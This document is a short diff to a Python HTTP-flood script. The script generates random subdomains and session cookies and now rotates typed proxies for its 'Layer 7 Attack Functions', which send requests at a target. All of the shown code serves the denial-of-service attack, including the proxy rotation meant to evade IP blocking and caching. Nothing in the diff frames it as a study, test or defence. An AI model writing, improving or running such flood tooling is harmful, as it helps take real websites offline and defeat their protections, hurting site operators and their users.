@@ -4,7 +4,8 @@ import time
 import random
 import string
 from typing import List
-
+from random import choice
+from typing import Dict
 def random_subdomain(domain: str) -> str:
     sub = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
     return f"http://{sub}.{domain}"
@@ -12,9 +13,24 @@ def random_subdomain(domain: str) -> str:
 def random_cookie() -> str:
     return f"PHPSESSID={''.join(random.choices(string.ascii_letters + string.digits, k=26))}"
 
-def get_proxy(proxies: List[str]) -> dict:
-    proxy = random.choice(proxies) if proxies else None
-    return {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
+def get_proxy(proxies: Dict[str, List[str]]) -> Dict[str, str]:
+    # Flatten all proxies and retain type
+    all_types = [ptype for ptype in proxies for _ in proxies[ptype]]
+    all_values = sum(proxies.values(), [])
+
+    if not all_values:
+        return None
+
+    index = choice(range(len(all_values)))
+    ptype = all_types[index]
+    ipport = all_values[index]
+
+    proxy_url = f"{ptype}://{ipport}"
+
+    return {
+        "http": proxy_url,
+        "https": proxy_url
+    }
 
 # === Layer 7 Attack Functions ===
 def get_request(url, proxies): requests.get(url, proxies=get_proxy(proxies), timeout=5)
